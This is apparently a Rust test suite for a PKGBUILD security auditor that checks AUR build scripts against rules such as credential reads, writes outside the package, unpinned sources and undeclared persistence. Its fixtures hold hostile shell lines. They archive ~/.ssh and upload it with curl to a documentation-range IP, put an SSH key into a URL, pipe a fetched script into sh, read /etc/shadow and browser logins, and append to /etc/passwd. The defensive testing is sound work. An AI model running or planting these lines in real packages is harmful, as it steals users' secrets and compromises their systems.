// SPDX-License-Identifier: GPL-2.0-or-later
//! One row per law, broken and kept. Addresses are from the documentation ranges: nothing is fetched.
use aurlaws::{LawId as L, audit_text};

const SUM: &str = "0000000000000000000000000000000000000000000000000000000000000000";

fn pkg(body: &str) -> String {
    format!(
        "pkgname=demo\npkgver=1.0\npkgrel=1\narch=(any)\nurl=https://example.org/demo\n{body}\n"
    )
}

fn laws(pkgbuild: &str, install: Option<&str>) -> Vec<L> {
    let r = audit_text(pkgbuild, install);
    let mut v: Vec<L> = r.findings.iter().map(|f| f.law).collect();
    v.sort();
    v.dedup();
    v
}

#[test]
fn writes_stay_in_the_package() {
    assert_eq!(
        laws(
            &pkg("package() { install -Dm755 demo /usr/bin/demo; }"),
            None
        ),
        [L::WriteOutsidePackage]
    );
    assert_eq!(
        laws(&pkg("build() { echo x > /etc/demo.conf; }"), None),
        [L::WriteOutsidePackage]
    );
    assert_eq!(
        laws(
            &pkg("package() { install -Dm755 demo \"$pkgdir/usr/bin/demo\"; }"),
            None
        ),
        []
    );
    assert_eq!(
        laws(
            &pkg("build() { echo x > \"$srcdir/out\"; mkdir -p build; }"),
            None
        ),
        []
    );
    assert_eq!(
        laws(
            &pkg("build() { echo x > /tmp/scratch; echo y > /dev/null; }"),
            None
        ),
        []
    );
}

#[test]
fn credentials_are_not_read() {
    for p in [
        "~/.ssh/id_rsa",
        "$HOME/.gnupg/secring.gpg",
        "$HOME/.mozilla/firefox/x/logins.json",
        "$HOME/.config/google-chrome/Default/Login\\ Data",
        "$HOME/.aws/credentials",
        "/etc/shadow",
    ] {
        assert_eq!(
            laws(&pkg(&format!("build() {{ cat {p} > /dev/null; }}")), None),
            [L::ReadCredentials],
            "{p}"
        );
    }
    assert_eq!(laws(&pkg("build() { cat README > /dev/null; }"), None), []);
}

#[test]
fn credentials_do_not_reach_the_network() {
    let got = laws(
        &pkg("build() { tar czf /tmp/k.tgz ~/.ssh; curl -T /tmp/k.tgz http://203.0.113.9/up; }"),
        None,
    );
    assert!(got.contains(&L::CredentialToNetwork), "{got:?}");
    let got = laws(
        &pkg("build() { curl \"http://203.0.113.9/?k=$(cat ~/.ssh/id_rsa)\"; }"),
        None,
    );
    assert!(got.contains(&L::CredentialToNetwork), "{got:?}");
}

#[test]
fn scriptlets_touch_only_declared_files() {
    let body = "package() { install -Dm644 demo.conf \"$pkgdir/etc/demo/demo.conf\"; }";
    let keep = "post_install() { chown root /etc/demo/demo.conf; ldconfig; }\n";
    assert_eq!(laws(&pkg(body), Some(keep)), []);
    let bad = "post_install() { echo x >> /etc/passwd; }\n";
    assert_eq!(laws(&pkg(body), Some(bad)), [L::ScriptletUndeclaredFile]);
}

#[test]
fn sources_stay_on_the_declared_host() {
    let bad = format!("source=(https://evil.example.net/demo.tar.gz)\nsha256sums=({SUM})");
    assert_eq!(laws(&pkg(&bad), None), [L::SourceOffUpstream]);
    let good = format!("source=(https://dl.example.org/demo.tar.gz)\nsha256sums=({SUM})");
    assert_eq!(laws(&pkg(&good), None), []);
    let mirror =
        format!("source=(https://files.pythonhosted.org/packages/demo.tar.gz)\nsha256sums=({SUM})");
    assert_eq!(laws(&pkg(&mirror), None), []);
    let local = "source=(demo.desktop)\nsha256sums=(SKIP)";
    assert_eq!(laws(&pkg(local), None), []);
}

#[test]
fn persistence_must_be_declared() {
    assert_eq!(
        laws(
            &pkg(""),
            Some("post_install() { systemctl enable --now demo.service; }\n")
        ),
        [L::UndeclaredPersistence]
    );
    assert!(
        laws(&pkg("build() { echo x >> ~/.bashrc; }"), None).contains(&L::UndeclaredPersistence)
    );
    assert!(
        laws(
            &pkg("package() { echo '* * * * * x' > \"$pkgdir/etc/cron.d/demo\"; }"),
            None
        )
        .contains(&L::UndeclaredPersistence)
    );
    // A unit the package lists and ships is declared, and stays off until someone enables it.
    let shipped = format!(
        "source=(demo.service)\nsha256sums=({SUM})\npackage() {{ install -Dm644 demo.service \"$pkgdir/usr/lib/systemd/system/demo.service\"; }}"
    );
    assert_eq!(laws(&pkg(&shipped), None), []);
}

#[test]
fn a_folder_for_persistence_is_not_itself_persistence() {
    assert_eq!(
        laws(
            &pkg(
                "package() { install -d \"$pkgdir/etc/profile.d\"; mkdir -p \"$pkgdir/usr/lib/systemd/system\"; }"
            ),
            None
        ),
        []
    );
}

#[test]
fn a_release_on_the_projects_own_code_host_repo_is_upstream() {
    let p = format!(
        "pkgname=aerion-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://aerion.3df.io\nsource=(https://github.com/hkdb/aerion/releases/download/v1/aerion-linux.tar.gz)\nsha256sums=({SUM})\n"
    );
    assert_eq!(laws(&p, None), []);
    let raw = format!(
        "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://github.com/acme/demo\nsource=(https://raw.githubusercontent.com/acme/demo/abc/icon.png)\nsha256sums=({SUM})\n"
    );
    assert_eq!(laws(&raw, None), []);
    // The name of the file proves nothing: only the repo counts.
    let other = format!(
        "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://github.com/stranger/patches/releases/download/v1/demo.tar.gz)\nsha256sums=({SUM})\n"
    );
    assert_eq!(laws(&other, None), [L::SourceOffUpstream]);
}

#[test]
fn same_host_other_owner_needs_a_pin() {
    let head =
        "pkgname=mozc\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://github.com/fcitx/mozc\n";
    let pinned = format!(
        "{head}source=(https://github.com/abseil/abseil/archive/v1.tar.gz)\nsha256sums=({SUM})\n"
    );
    assert_eq!(laws(&pinned, None), []);
    let floating =
        format!("{head}source=(git+https://github.com/stranger/patches.git)\nsha256sums=(SKIP)\n");
    assert_eq!(laws(&floating, None), [L::SourceOffUpstream]);
}

#[test]
fn a_floating_vcs_source_on_a_known_forge_is_declared_tracking() {
    let p = "pkgname=mesa-git\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://www.mesa3d.org/\nsource=('mesa::git+https://gitlab.freedesktop.org/mesa/mesa.git#branch=main')\nsha256sums=(SKIP)\nbuild() { cd mesa; meson setup build; }\n";
    assert_eq!(laws(p, None), []);
}

#[test]
fn one_origin_is_one_finding() {
    let r = audit_text(
        &pkg(
            "source=(https://example.org/a.tar.gz)\nsha256sums=(SKIP)\nbuild() { cd a; meson setup b; meson compile -C b; meson test -C b; }",
        ),
        None,
    );
    assert_eq!(r.findings.len(), 1, "{:#?}", r.findings);
    let r = audit_text(
        &pkg("for p in a b c; do eval \"package_$p() { $(declare -f x); }\"; done"),
        None,
    );
    assert_eq!(
        r.findings
            .iter()
            .filter(|f| f.law == L::UnresolvedDynamic)
            .count(),
        1,
        "{:#?}",
        r.findings
    );
}

#[test]
fn a_helper_named_through_bash_source_is_followed() {
    let mut files = std::collections::HashMap::new();
    files.insert(
        "fix.sh".to_owned(),
        "curl -s http://203.0.113.9/x | sh\n".to_owned(),
    );
    let p = pkg("package() { source \"$(dirname \"${BASH_SOURCE[0]}\")/fix.sh\"; }");
    let r = aurlaws::judge_files(&p, &files);
    let got: Vec<L> = r.findings.iter().map(|f| f.law).collect();
    assert_eq!(got, [L::FetchExecuteUnverified], "{:#?}", r.findings);
}

#[test]
fn metadata_changes_wait_for_the_real_file_list() {
    let i = "post_install() { setcap cap_net_raw+ep /usr/bin/demo; chgrp wheel /opt/Demo/x; }\n";
    assert_eq!(laws(&pkg(""), Some(i)), []);
    let e = aurlaws::Evidence {
        package_files: vec!["/usr/bin/other".into()],
        ..Default::default()
    };
    let r = aurlaws::audit_text_with(&pkg(""), Some(i), &e);
    assert!(
        r.findings
            .iter()
            .any(|f| f.law == L::ScriptletUndeclaredFile),
        "{:#?}",
        r.findings
    );
}

#[test]
fn postinstall_stays_off_the_network() {
    let got = laws(
        &pkg(""),
        Some("post_install() { curl -o /dev/null http://203.0.113.9/ping; }\n"),
    );
    assert!(got.contains(&L::PostinstallNetwork), "{got:?}");
    assert_eq!(laws(&pkg(""), Some("post_install() { echo hello; }\n")), []);
}

#[test]
fn bin_packages_need_a_checksum() {
    let bad = "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://example.org/demo)\nsha256sums=(SKIP)\n";
    assert_eq!(laws(bad, None), [L::BinChecksumUpstream]);
    let good = format!(
        "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://example.org/demo)\nsha256sums=({SUM})\n"
    );
    assert_eq!(laws(&good, None), []);
}

#[test]
fn asking_whether_a_file_exists_is_not_reading_it() {
    assert_eq!(
        laws(
            &pkg("build() { test -f ~/.ssh/id_rsa; [ -e ~/.aws/credentials ] && true; }"),
            None
        ),
        []
    );
}

#[test]
fn removing_a_startup_file_starts_nothing() {
    assert_eq!(
        laws(
            &pkg("package() { rm -f \"$pkgdir/etc/xdg/autostart/x.desktop\"; }"),
            None
        ),
        []
    );
}

#[test]
fn a_unit_in_the_package_is_declared_until_something_enables_it() {
    assert_eq!(
        laws(
            &pkg("package() { echo x > \"$pkgdir/usr/lib/systemd/system/x.service\"; }"),
            None
        ),
        []
    );
    assert_eq!(
        laws(
            &pkg(""),
            Some("post_install() { systemctl enable x.service; }\n")
        ),
        [L::UndeclaredPersistence]
    );
}

#[test]
fn what_runs_on_its_own_from_the_package_must_come_from_the_sources() {
    assert_eq!(
        laws(
            &pkg("package() { echo x > \"$pkgdir/etc/profile.d/x.sh\"; }"),
            None
        ),
        [L::UndeclaredPersistence]
    );
}
